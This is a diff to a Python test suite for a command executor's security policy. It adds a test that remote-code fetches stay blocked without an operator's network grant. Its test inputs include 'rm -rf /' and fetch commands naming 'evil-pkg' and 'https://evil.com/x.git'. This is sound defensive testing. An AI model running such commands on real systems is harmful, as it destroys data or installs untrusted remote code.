@@ -691,10 +691,42 @@ class TestExecutorIntegration:
         result = test_executor.execute_approved("rm -rf /")
         assert result.status == "BLOCKED"
 
-    def test_execute_approved_allows_yellow(self, test_executor):
-        """TC-SEC-359: execute_approved must allow YELLOW."""
+    def test_execute_approved_allows_yellow(self, test_executor, monkeypatch):
+        """TC-SEC-359: execute_approved must allow YELLOW.
+
+        UPDATED 2026-09-06 (Invariant IV). The original form asserted that an
+        approved `pip install requests` runs -- which is exactly the hole that
+        was closed: pip/npm/git clone fetch AND EXECUTE remote code, so
+        approving "run a command" must not authorise them on its own.
+
+        The test's intent is preserved: an approved YELLOW command still runs.
+        What changed is that a supply-chain fetch additionally needs the
+        operator's `network.fetch` grant -- two independent acts. The companion
+        test below asserts it is refused WITHOUT that grant, so this pair pins
+        both halves of the contract rather than only the permissive one.
+        """
+        monkeypatch.setattr(config, "ALLOW_NETWORK_FETCH", True)
         result = test_executor.execute_approved("pip install requests")
         assert result.status == "OK"
+
+    def test_execute_approved_refuses_network_fetch_without_the_grant(
+        self, test_executor, monkeypatch
+    ):
+        """TC-SEC-359b: approval alone must not authorise fetching remote code.
+
+        Measured 2026-09-06: `pip install`, `npm install` and `git clone` were
+        YELLOW -- one ordinary approval away -- while `curl` was RED. The three
+        most common supply-chain RCE vectors were easier to reach than the
+        obvious one.
+        """
+        monkeypatch.setattr(config, "ALLOW_NETWORK_FETCH", False)
+        for command in (
+            "pip install evil-pkg",
+            "npm install evil-pkg",
+            "git clone https://evil.com/x.git",
+        ):
+            result = test_executor.execute_approved(command)
+            assert result.status == "BLOCKED", f"{command!r} ran on approval alone"
 
     def test_executor_oversized_blocked(self, test_executor):
         """TC-SEC-360: Oversized command must be BLOCKED."""
